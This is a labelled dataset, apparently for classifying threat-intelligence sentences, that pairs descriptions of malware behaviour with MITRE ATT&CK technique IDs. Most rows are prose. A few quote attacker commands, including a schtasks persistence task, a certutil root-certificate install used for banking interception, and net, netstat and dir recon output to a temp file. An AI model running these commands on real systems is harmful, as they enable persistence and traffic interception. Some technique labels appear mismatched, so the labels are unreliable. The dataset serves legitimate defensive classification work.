text1	labels
creates a backdoor through which remote attackers can steal system information.	['T1005', 'T1005']
captures window titles.	['T1010', 'T1010']
hides any strings related to its own indicators of compromise.	['T1027', 'T1027']
creates a backdoor through which remote attackers can open a command-line interface.	['T1059', 'T1059']
stages collected data in a text file.	['T1074', 'T1074']
can download and execute a second-stage payload.	['T1105', 'T1105']
creates a backdoor through which remote attackers can upload files.	['T1105', 'T1105']
creates a Registry subkey that registers a new system device.	['T1112', 'T1112']
At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse	['T1564.001', 'T1564.001']
If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards	['T1204.002', 'T1105']
For both the receiving of C2 commands and exfiltration, Remexi uses the Microsoft Background Intelligent Transfer Service (BITS) mechanism to communicate with the C2 over HTTP	['T1071.001', 'T1041', 'T1071', 'T1132']
The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs	['T1056.001', 'T1056']
f) Hadoop YARN ResourceManager – Command Execution (exploit) g) CVE-2016-3088: Apache ActiveMQ Fileserver File Upload Remote Code Execution Vulnerability	['T1203', 'T1203', 'T1105']
The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems	['T1053.005', 'T1053', 'T1053.005']
"""beacon"" payload can collect information on process details."	['T1057']
"""beacon"" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic."	['T1026']
"""beacon"" payload is capable of capturing screen shots."	['T1113']
"2 contains a ""Destroy"" plug-in that destroys data stored on victim hard drives by overwriting file contents."	['T1070.004']
A  .dll file is digitally signed by a certificate from AirVPN.	['T1553.002']
A  .dll that contains  is loaded and executed using DLL side-loading.	['T1574.002']
A  2 plug-in uses WMI to gather victim host details.	['T1047']
A backdoor used by  created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.	['T1090.003']
abuses NTFS transactions to launch and conceal malicious processes.	['T1055.013']
abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.	['T1574.001']
accessed email accounts using Outlook Web Access.	['T1114']
accesses network share(s), enables share access to the target device, and copies an executable payload to the target system, and uses a  to execute the malware.	['T1021.002']
accesses the HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.	['T1012']
achieves persistence by adding a shortcut of itself to the startup path in the Registry.	['T1547.001']
achieves persistence by adding itself to the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Registry key.	['T1547.001']
achieves persistence by creating a Registry entry in HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.	['T1547.001']
achieves persistence by creating a shortcut in the current user's Startup folder.	['T1547.009', 'T1547.001']
achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.	['T1547.009', 'T1547.001']
achieves persistence by making an entry in the Registry's Run key.	['T1547.001']
achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.	['T1547.001']
actors have been known to copy files to the network shares of other computers to move laterally.	['T1021.002']
actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.	['T1546.008']
actors have split RAR files for exfiltration into parts.	['T1030']
actors have used  and a modified version of  called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.	['T1003']
actors have used DLL side-loading. Actors have used legitimate Kaspersky anti-virus variants in which the DLL acts as a stub loader that loads and executes the shell code.	['T1574.002']
actors leverage legitimate credentials to log into external remote services.	['T1078', 'T1133']
actors obtained a list of active processes on the victim and sent them to C2 servers.	['T1057']
actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.	['T1078']
actors spawned shells on remote systems on a victim network to execute commands.	['T1059']
actors used compromised credentials for the victim's endpoint management platform, Altiris, to move laterally.	['T1078']
actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.	['T1078']
actors used the following command following exploitation of a machine with  malware to display network connections: netstat -ano >> %temp%\download	['T1049']
actors used the following command following exploitation of a machine with  malware to obtain information about services: net start >> %temp%\download	['T1007']
"actors used the following commands after exploiting a machine with  malware to obtain information about files and directories: dir c:\ >> %temp%\download dir ""c:\Documents and Settings"" >> %temp%\download dir ""c:\Program Files\"" >> %temp%\download dir d:\ >> %temp%\download"	['T1083']
actors used the following commands following exploitation of a machine with  malware to enumerate user accounts: net user >> %temp%\download net user /domain >> %temp%\download	['T1087']
"actors used the following command to rename one of their tools to a benign file name: ren ""%temp%\upload"" audiodg.exe"	['T1036']
actors used the native  Windows task scheduler tool to use scheduled tasks for execution on a victim network.	['T1053.005']
actors use nbtscan to discover vulnerable systems.	['T1016']
actors use the Hunter tool to conduct network service discovery for vulnerable systems.	['T1046']
actors use  to schedule tasks to run self-extracting RAR archives, which install  or  on other victims on a network.	['T1053.005']
"added ""junk data"" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a ""junk length"" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire."	['T1001']
added junk data to outgoing UDP packets to peer implants.	['T1001']
added newly created accounts to the administrators group to maintain elevated access.	['T1098']
added Registry Run keys to establish persistence.	['T1547.001']
adds a .lnk file to the Windows startup folder.	['T1547.009']
adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.	['T1543.001']
adds an entry to the rc.common file for persistence.	['T1037.004']
adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.	['T1036']
adds a new service named NetAdapter to establish persistence.	['T1543.003']
adds a Registry Run key for ctfmon.exe to establish persistence.	['T1547.001']
adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.	['T1547.001']
adds a Registry Run key to establish persistence.	['T1547.001']
adds Registry Run keys to achieve persistence.	['T1547.001']
A Destover-like implant used by  can obtain the current system time and send it to the C2 server.	['T1124']
A Destover-like variant used by  uses a batch file mechanism to delete its binaries from the system.	['T1064']
A dropper used by  installs itself into the ASEP Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run with a value named McUpdate.	['T1547.001']
Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.	['T1053.005', 'T1021.002', 'T1078']
A  file stealer can communicate over HTTP for C2.	['T1071']
A  file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.	['T1082']
A  file stealer can gather the victim's username to send to a C2 server.	['T1033']
A  file stealer can run a TaskScheduler DLL to add persistence.	['T1053.005']
A  file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.	['T1025']
A  file stealer transfers collected files to a hardcoded C2 server.	['T1041']
After collecting files and logs from the victim,  encrypts some collected data with Blowfish.	['T1486']
After compromising a victim,  lists all running processes.	['T1057']
After copying itself to a DLL file, a variant of  calls the DLL file using rundll32.exe.	['T1218.011']
After decrypting itself in memory,  downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system.	['T1055']
After downloading its main config file,  downloads multiple payloads from C2 servers.	['T1105']
After encrypting C2 data,  converts it into a hexadecimal representation and then encodes it into base64.	['T1001']
After encrypting log files, the log encryption module in  deletes the original, unencrypted files from the host.	['T1070']
After initial compromise,  will download a second stage to establish a more permanent presence on the affected system.	['T1104']
After using raw sockets to communicate with its C2 server,  uses a decrypted string to create HTTP POST requests.	['T1071']
aggregates collected data in a tmp file.	['T1074']
A  implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.	['T1036']
A  Javascript backdoor added a local_update_check value under the Registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to establish persistence. Additionally, a  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.	['T1547.001']
A  JavaScript backdoor has used Google Apps Script as its C2 server.	['T1102']
A keylogging tool used by  gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.	['T1016']
A Linux version of  checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges.  also gathers the username of the victim.	['T1033']
allows actors to spawn a reverse shell on a victim.	['T1059']
allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.	['T1083']
allows adversaries to execute shell commands on the infected host.	['T1059']
"allows adversaries to modify the way the ""beacon"" payload communicates. This is called ""Malleable C2"" in the  manual and is intended to allow a penetration test team to mimic known APT C2 methods."	['T1095']
allows adversaries to search for files.	['T1083']
A  macro deletes files after it has decoded and decompressed them.	['T1070.004']
A  malware sample adds persistence on the system by creating a shortcut in the user’s Startup folder.	['T1547.009']
A  malware sample encodes data with base64.	['T1132']
A  malware sample performs reflective DLL injection.	['T1055']
A  module has a default C2 port of 13000.	['T1571']
A module in  collects information from the victim about installed anti-virus software.	['T1518.001']
A module in  collects information from the victim about its IP addresses and MAC addresses.	['T1016']
A module in  collects information from the victim about the current user name.	['T1033']
A module in  collects information from the victim about Windows OS version, computer name, battery info, and physical memory.	['T1082']
A module in  collects information on available printers and disk drives.	['T1120']
An  backdoor may collect the entire contents of an inserted USB device.	['T1025']
"An  downloader creates persistence by creating the following scheduled task: schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON /ru ""System""."	['T1053.005']
An  downloader establishes SOCKS5 connections for its initial C2.	['T1090', 'T1095']
An  downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.	['T1104']
"An  downloader uses the Windows command ""cmd.exe"" /C whoami. The group also uses a tool to execute commands on remote computers."	['T1059']
"An  downloader uses the Windows command ""cmd.exe"" /C whoami to verify that it is running with the elevated privileges of “System.”"	['T1033']
An executable dropped onto victims by  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).	['T1055']
An  HTTP malware variant decrypts strings using single-byte XOR keys.	['T1140']
An  HTTP malware variant establishes persistence by setting the Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\.	['T1547.001']
An  HTTP malware variant used Base64 to encode communications to the C2 server.	['T1132']
An  loader Trojan adds the Registry key HKCU\Environment\UserInitMprLogonScript to establish persistence.	['T1037']
An  loader Trojan uses a batch script to run its payload.	['T1064']
An  loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.	['T1057']
An older variant of  performs UAC bypass.	['T1548.002']
An older version of  has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.	['T1083']
An  Port 22 malware variant registers itself as a service.	['T1543.003']
A  payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.	['T1112']
A  payload has searched all fixed drives on the victim for files matching a specified list of extensions.	['T1083']
A  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.	['T1055.012']
A  payload was packed with UPX.	['T1027.002']
APIs and strings in some  variants are RC4 encrypted. Another variant is encoded with XOR.	['T1027']
apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.	['T1027.001', 'T1027.005']
appears to have functionality to modify remote Registry information.	['T1112']
appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.	['T1027']
appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.	['T1027.001']
As part of the data reconnaissance phase,  grabs the system time to send back to the control server.	['T1124']
A system info module in  gathers information on the victim host’s configuration.	['T1082']
A  tool can create a new service, naming it after the config information, to gain persistence.	['T1543.003']
A  tool can encrypt payloads using XOR.  malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.	['T1027']
A  tool can read and decrypt stored Registry values.	['T1012']
A  tool can spawn svchost.exe and inject the payload into that process.	['T1055']
A  tool can use a public UAC bypass method to elevate privileges.	['T1548.002']
A  tool can use WMI to execute a binary.	['T1047']
attempted to contact the C2 server over TCP using port 80.	['T1043']
attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.	['T1204']
attempted to get users to click on Microsoft Excel attachments containing malicious macro scripts.	['T1204']
attempted to get users to launch malicious attachments delivered via spearphishing emails.	['T1204']
attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.	['T1204']
attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.	['T1598.003']
attempted to use RDP to move laterally.	['T1021.001']
attempts to access the ADMIN$, C$\Windows, D$\Windows, and E$\Windows shares on the victim with its current privileges.	['T1083']
attempts to add a shortcut file in the Startup folder to achieve persistence.	['T1547.009']
attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.	['T1547.001']
"attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs ""louder"" interactions with the malware."	['T1104']
attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.	['T1548.002']
attempts to detect several anti-virus products.	['T1518.001']
attempts to disable UAC remote restrictions by modifying the Registry.	['T1548.002']
attempts to download an encrypted binary from a specified domain.	['T1105']
attempts to escalate privileges by bypassing User Access Control.	['T1548.002']
attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.	['T1068']
attempts to hide its payloads using legitimate filenames.	['T1036']
attempts to obtain legitimate credentials during operations.	['T1078']
attempts to overwrite operating system files with image files.	['T1070.004']
A  uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.	['T1027']
automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.	['T1119']
automatically searches for files on local drives based on a predefined list of file extensions.	['T1083']
automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes.  also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.	['T1020']
A  variant can force the compromised system to function as a proxy server.	['T1090']
A  variant downloads the backdoor payload via the BITS service.	['T1197']
A  variant encodes C2 POST data base64.	['T1132']
A  variant has used DLL side-loading.	['T1574.002']
A  variant has used rundll32 for execution.	['T1218.011']
A  variant is encoded using a simple XOR cipher.	['T1027']
A variant of  attempts communication to the C2 server over HTTP on port 443.	['T1043']
A variant of  encrypts some C2 with 3DES and RSA.	['T1573']
A variant of  executes dir C:\progra~1 when initially run.	['T1083']
A  variant uses a C2 mechanism similar to port knocking that allows attackers to connect to a victim without leaving the connection open for more than a few sectonds.	['T1095']
A  variant uses DLL search order hijacking.	['T1574.001']
A  variant uses fake TLS to communicate with the C2 server.	['T1095']
A  VBA Macro sets its file attributes to System and Hidden.	['T1564.001']
A  VBScript receives a batch script to execute a set of commands in a command prompt.	['T1119']
A version of  introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.	['T1027.001']
A version of  loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques.	['T1127']
avoids analysis by encrypting all strings, internal files, configuration data.	['T1027']
A Word document delivering  prompts the user to enable macro execution.	['T1204']
Based on comparison of  versions,  made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.	['T1027.005']
beacons to destination port 443.	['T1043']
Before being appended to image files,  commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.	['T1573']
Before writing to disk,  inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.	['T1027.001']
binds and listens on port 1058.	['T1571']
binds and listens on port 443.	['T1043']
bypassed User Access Control (UAC).	['T1548.002']
bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.	['T1548.002']
bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).	['T1548.002']
C2 messages are Base64-encoded.	['T1132']
C2 servers communicated with malware over TCP 8081, 8282, and 8083.	['T1571']
C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers.	['T1001']
C2 traffic can communicate via TCP raw sockets.	['T1095']
C2 traffic for most  tools occurs over Port Numbers 53, 80, and 443.	['T1043']
C2 traffic from  is encrypted, then encoded with Base64 encoding.	['T1132']
C2 traffic has been encrypted with RC4 and AES.	['T1573']
C2 traffic is base64-encoded.	['T1132']
C2 traffic is encrypted using bitwise NOT and XOR operations.	['T1573']
calls cmd.exe to run various DLL files via rundll32.	['T1218.011']
calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.  also has the capability to invoke a reverse shell.	['T1059']
can accept multiple URLs for C2 servers.	['T1008']
can add a new service to ensure  persists on the system when delivered as another payload onto the system.	['T1543.003']
can add or remove applications or ports on the Windows firewall or disable it entirely.	['T1562.001']
can alter the victim's proxy configuration.	['T1562.001']
can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.	['T1548.002']
can be added as a service to establish persistence.	['T1543.003']
can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.	['T1090']
can be configured to use HTTP or DNS for command and control.	['T1071']
can be configured to use multiple network protocols to avoid network-based detection.	['T1026']
can be configured to use raw TCP or UDP for command and control.	['T1095']
can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.	['T1574.001']
can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.	['T1546.007']
can be used to copy files to a remotely connected system.	['T1105']
can be used to create  to upload and/or download files.	['T1105']
can be used to create  to upload files from a compromised host.	['T1048']
can be used to delete files from the file system.	['T1070.004']
can be used to disable local firewall settings.	['T1562.001']
can be used to discover current NetBIOS sessions.	['T1049']
can be used to discover local NetBIOS domain names.	['T1016']
can be used to discover processes running on a system.	['T1057']
can be used to discover services running on a system.	['T1007']
can be used to discover system firewall settings.	['T1518.001']
can be used to display ARP configuration information on the host.	['T1016']
can be used to download files from a given URL.	['T1105']
can be used to dump credentials.	['T1003']
can be used to enumerate local network connections, including active TCP connections and other network statistics.	['T1049']
can be used to enumerate security software currently running on a system by process name of known products.	['T1518.001']
can be used to execute binaries on remote systems by creating and starting a service.	['T1569.002']
can be used to find files and directories with native functionality such as dir commands.	['T1083']
can be used to find information about the operating system.	['T1082']
can be used to gather information about the operating system.	['T1082']
can be used to identify remote systems within a network.	['T1018']
can be used to install browser root certificates as a precursor to performing man-in-the-middle between connections to banking websites. Example command: certutil -addstore -f -user ROOT ProgramData\cert512121.der.	['T1553.004']
can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)	['T1083']
can be used to schedule a task on a system.	['T1053.005']
can be used to set up a proxy tunnel to allow remote host access to an infected host.	['T1090']
can be used to subvert controls and possibly conceal command execution by not directly invoking .	['T1202']
can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.	['T1548.002']
can capture a screenshot from a victim.	['T1113']
can capture desktop screenshots in the PNG format and send them to the C2 server.	['T1113']
can capture screenshots.	['T1113']
can capture screenshots at a configurable interval.	['T1113']
can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.	['T1113']
can capture screenshots of the victim’s machine.	['T1113']
can capture the victim's screen.	['T1113']
can change Internet Explorer settings to reduce warnings about malware activity.	['T1562.001']
can collect CPU and architecture information from the victim’s machine.	['T1082']
can collect data from a local system.	['T1005']
can collect data from user directories.	['T1005']
can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.	['T1082']
can communicate over a reverse proxy using SOCKS5.	['T1090']
can communicate over FTP and send email over SMTP.	['T1071']
can communicate over HTTP, SMTP, and POP3 for C2.	['T1071']
can communicate over HTTP for C2.	['T1071']
can communicate to its C2 over HTTP and HTTPS if directed.	['T1071']
can communicate to its C2 over TCP using a custom binary protocol.	['T1095']
can communicate using SOCKS.	['T1095']
can compress data with Zip before sending it over C2.	['T1560']
can conduct file browsing.	['T1083']
can create a directory (C:\ProgramData\Mail\MailAg\gl) to use as a temporary directory for uploading files.	['T1074']
can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.	['T1036']
can create a new service named msamger (Microsoft Security Accounts Manager).	['T1543.003']
can create a remote shell and run a given command.	['T1059']
can create a shortcut in the Windows startup folder for persistence.	['T1547.009', 'T1547.001']
"can create backdoor accounts with the login ""HelpAssistant"" with the Limbo module."	['T1136']
can delete all Registry entries created during its execution.	['T1112']
can delete a specified file.	['T1070.004']
can delete files and directories.	['T1070.004']
can delete files and itself after infection to avoid analysis.	['T1070.004']
can delete files and optionally overwrite with random data beforehand.	['T1070.004']
can delete files off the system.	['T1070.004']
can delete files on the victim’s machine.	['T1070.004']
can delete files written to disk.	['T1070.004']
can delete itself or specified files.	['T1070.004']
can delete malware and associated artifacts from the victim.	['T1070.004']
can delete services from the victim’s machine.	['T1543.003']
can delete specified files.	['T1070.004']
"can deliver ""beacon"" payloads for lateral movement by leveraging remote COM execution."	['T1021.003']
can disable Avira anti-virus.	['T1562.001']
can disable Microsoft Office Protected View by changing Registry keys.	['T1562.001']
can discover and collect victim system information.	['T1082']
can download additional encrypted backdoors onto the victim via GIF files.	['T1105']
can download additional files.	['T1105']
can download additional files and payloads to compromised hosts.	['T1105']
can download additional files from URLs.	['T1105']
can download additional payloads onto the victim.	['T1105']
can download and execute additional files.	['T1105']
can download and execute an arbitary executable.	['T1105']
can download and execute files.	['T1105']
can download and launch additional payloads.	['T1105']
can download and upload files to and from the victim’s machine.	['T1105']
can download and upload files to the victim's machine.	['T1105']
can download an executable to run on the victim.	['T1105']
can download files from its C2 server to the victim's machine.	['T1105']
can download files from remote servers.	['T1105']
can download files from the C2 server to the victim’s machine.	['T1105']
can download files off the target system to send back to the server.	['T1005']
can download files onto the victim.	['T1105']
can download files remotely.	['T1105']
can download or upload files from its C2 server.	['T1105']
can download remote files.	['T1105']
can download remote files and additional payloads to the victim's machine.	['T1105']
can download remote files onto victims.	['T1105']
can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.	['T1113']
can dump credentials.	['T1003']
can dump passwords and save them into \ProgramData\Mail\MailAg\pwds.txt.	['T1003']
can dump the SAM database.	['T1003']
can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.	['T1021.001']
can enable remote desktop on the victim's machine.	['T1021.001']
can encrypt C2 traffic with AES.	['T1573']
can enumerate active windows.	['T1010']
can enumerate and search for files and directories.	['T1083']
can enumerate drives and Remote Desktop sessions.	['T1049']
can enumerate drives and their types. It can also change file permissions using cacls.exe.	['T1083']
can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.	['T1033']
can enumerate processes.	['T1057']
can enumerate Registry keys.	['T1012']
can enumerate Registry values, keys, and data.	['T1012']
"can establish persistence by adding a Scheduled Task named ""Microsoft Boost Kernel Optimization""."	['T1053.005']
can establish persistence by adding Registry Run keys.	['T1547.001']
can establish persistence by creating a .lnk file in the Start menu.	['T1547.001']
can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.	['T1547.009']
can establish persistence by creating a scheduled task.	['T1053.005']
can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon.	['T1547.004']
can establish persistence through the system screensaver by configuring it to execute the malware.	['T1546.002']
can establish using a AppCertDLLs Registry key.	['T1546.009']
can establish using a Registry run key.	['T1547.001']
can execute a payload on a remote host with PowerShell. This technique does write any data to disk.	['T1059.001']
can execute a task to download a file.	['T1105']
can execute commands from its C2 server.	['T1059']
can execute commands on the victim.	['T1059']
can execute commands on the victim's machine.	['T1059']
can execute commands on victims.	['T1059']
can execute commands remotely by creating a new schedule task on the remote system	['T1053.005']
can execute commands remotely by creating a new service on the remote system.	['T1569.002']
can execute commands using a shell.	['T1059']
can execute commands using cmd.exe.	['T1059']
can execute commands with script as well as execute JavaScript.	['T1064']
can execute ipconfig on the victim’s machine.	['T1016']
can execute PowerShell scripts.	['T1059.001']
can execute shell commands using cmd.exe.	['T1059']
can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.	['T1048']
can exploit vulnerabilities such as MS14-058.	['T1068']
can extract cached password hashes from a system’s registry.	['T1003']
can function as a proxy to create a serve that relays communication between the client and C&C server.	['T1090']
can gather a list of processes.	['T1057']
can gather a process list from the victim.	['T1057']
can gather browser usernames and passwords.	['T1003']
can gather information about TCP connection state.	['T1049']
can gather information about the host.	['T1082']
can gather information on the mapped drives, OS version, computer name, and memory size.	['T1082']
can gather information on the victim username.	['T1033']
can gather network share information.	['T1135']
can gather Registry values.	['T1012']
can gather system information, the computer name, OS version, drive and serial information from the victim's machine.	['T1082']
can gather the disk volume information.	['T1082']
can gather the IP address from the victim's machine.	['T1016']
can gather the victim computer name and serial number.	['T1082']
can gather the victim user name.	['T1033']
can gather victim drive information.	['T1083']
can gather victim proxy information.	['T1016']
can get a list of the processes and running tasks on the system.	['T1057']
can identify logged in users across the domain and views user sessions.	['T1033']
can identify system information, including battery status.	['T1082']
can inject a malicious DLL into a process.	['T1055']
can inject a variety of payloads into processes dynamically chosen by the adversary.	['T1055']
can install a new service.	['T1543.003']
can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll and HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs.	['T1112']
can install itself as a new service.	['T1543.003']
can interact with a victim’s Outlook session and look through folders and emails.	['T1114']
can launch a remote shell to execute commands.	['T1059']
can launch cmd.exe to execute commands on the system.	['T1059']
can list all files on a system.	['T1083']
can list connected devices.	['T1120']
can list directories on a victim.	['T1083']
can list files and directories.	['T1083']
can list local and remote shared drives and folders over SMB.	['T1135']
can list running services.	['T1007']
can lists information about files in a directory.	['T1083']
can list the running processes and get the process ID and parent process’s ID.	['T1057']
can load a DLL using .	['T1218.011']
can load a DLL using the LoadLibrary API.	['T1129']
can log keystrokes.	['T1056']
can manipulate Registry keys.	['T1112']
can migrate into another process using reflective DLL injection.	['T1055']
can modify file or directory timestamps.	['T1070.006']
can modify service configurations.	['T1543.003']
can obtain a list of active connections and open ports.	['T1049']
can obtain a list of running processes on the victim’s machine.	['T1057']
can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.	['T1134']
can obtain a list of smart card readers attached to the victim.	['T1120']
can obtain a process list from the victim.	['T1057']
can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.	['T1016']
can obtain information about process integrity levels.	['T1057']
can obtain information about running processes on the victim.	['T1057']
can obtain information about security software on the victim.	['T1518.001']
can obtain information about the current user.	['T1033']
can obtain information about the logged on user both locally and for Remote Desktop sessions.	['T1033']
can obtain information about the victim's IP address.	['T1016']
can obtain information on installed anti-malware programs.	['T1518.001']
can obtain network information, including DNS, IP, and proxies.	['T1016']
can obtain passwords from common browsers and FTP clients.	['T1003', 'T1552.001']
can obtain running services on the victim.	['T1007']
can obtain screenshots from the victim.	['T1113']
can obtain the computer name, OS version, and default language identifier.	['T1082']
can obtain the date and time of a system.	['T1124']
can obtain the victim user name.	['T1033', 'T1069']
can open an interactive command-shell to perform command line functions on victim machines.	['T1059']
can open the Windows Firewall on the victim’s machine to allow incoming connections.	['T1562.001']
can overwrite Registry settings to reduce its visibility on the victim.	['T1070']
can perform DLL injection.	['T1055']
can perform DLL loading.	['T1055']
can perform keylogging.	['T1056']
can perform pass the hash.	['T1550.002']
can perform process injection by using a reflective DLL.	['T1055']
can perform screen captures of the victim’s machine.	['T1113']
can provide a remote shell.	['T1059']
can query for information contained within the Windows Registry.	['T1012']
can query service configuration information.	['T1007']
can receive and execute commands with cmd.exe. It can also provide a reverse shell.	['T1059']
can record audio using any existing hardware recording devices.	['T1123']
can record keystrokes from both the keyboard and virtual keyboard.	['T1056']
can record sound using input audio devices.	['T1123']
can record the sounds from microphones on a computer.	['T1123']
can recover hashed passwords.	['T1003']
can remotely activate the victim’s webcam to capture content.	['T1125']
can retrieve and execute additional  payloads from the C2 server.	['T1105']
can retrieve information about the Windows domain.	['T1016']
can retrieve IP and network adapter configuration information from compromised hosts.	['T1016']
can retrieve OS name/architecture and computer/domain name information from compromised hosts.	['T1082']
can retrieve the current content of the user clipboard.	['T1115']
can retrieve usernames from compromised hosts.	['T1087']
can run a command on another machine using .	['T1569.002']
can run a copy of cmd.exe.	['T1059']
can run  to gather information about the victim.	['T1082']
can scan for open TCP ports on the target network.	['T1046']
can scan local network for open SMB.	['T1135']
can scan victim drives to look for specific banking software on the machine to determine next actions. It also looks at browsing history and open tabs for specific strings.	['T1083']
can search directories for files on the victim’s machine.	['T1083']
"can set its ""beacon"" payload to reach out to the C2 server on an arbitrary and random interval. In addition it will break large data sets into smaller chunks for exfiltration."	['T1029']
can sleep for a specific time and be set to communicate at specific intervals.	['T1029']
can sniff plaintext network credentials and use NBNS Spoofing to poison name services.	['T1557.001']
can spawn remote shells.	['T1059']
can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.	['T1021.001']
can start SOCKS proxy threads.	['T1090']
can steal access tokens from exiting processes and make tokens from known credentials.	['T1134']
can steal clipboard contents.	['T1115']
can switch to a new C2 channel if the current one is broken.	['T1008']
can take a desktop screenshot and save the file into \ProgramData\Mail\MailAg\shot.png.	['T1113']
can take regular screenshots when certain applications are open that are sent to the command and control server.	['T1113']
can take screenshots.	['T1113']
can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.	['T1113']
can terminate a specific process by its process id.	['T1543.003']
